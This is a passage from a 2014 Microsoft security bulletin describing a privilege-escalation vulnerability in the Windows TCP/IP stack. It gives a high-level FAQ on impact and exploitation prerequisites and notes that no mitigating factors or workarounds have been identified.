Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### FAQ

**What is the component affected by this vulnerability?**
The component affected by this vulnerability is the TCP/IP stack (tcpip.sys and tcpip6.sys).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run arbitrary code in the context of another process. If this process runs with administrator privileges, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**How could an attacker exploit the vulnerability?**

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take complete control over the affected system.

**What systems are primarily at risk from the vulnerability?**

Networked Windows servers are affected by this vulnerability.

## Security Update Deployment

For Security Update Deployment information, see the Microsoft Knowledge Base article referenced in the Executive Summary.

## Acknowledgments

Microsoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure. See [Acknowledgments](https://technet.microsoft.com/library/security/dn820091.aspx) for more information.

## Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

## Revisions

* V1.0 (November 11, 2014): Bulletin published.

*Page generated 2015-01-14 11:47Z-08:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025


